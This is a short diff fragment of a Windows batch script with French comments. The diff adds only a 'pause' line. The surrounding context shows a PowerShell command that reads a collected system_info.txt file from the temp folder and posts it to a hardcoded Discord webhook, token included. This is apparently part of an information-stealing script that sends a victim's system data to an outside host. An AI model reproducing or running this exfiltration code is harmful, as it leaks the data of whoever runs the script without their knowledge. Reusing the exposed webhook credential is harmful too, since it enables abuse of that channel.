@@ -73,3 +73,5 @@
 :: Envoi du fichier au webhook Discord
 powershell -Command "$webhookUrl = 'https://discord.com/api/webhooks/1151525024088477868/uRlaL-EA8gyLBxmjfzoZg5aAB1QT24phwo9XA13_rA2tai3rMHp2E7KqZEKN9sMS54kF'; $content = Get-Content -Raw '%temp%\system_info.txt'; Invoke-RestMethod -Uri $webhookUrl -Method Post -Body @{content=$content}"
 
+pause
+
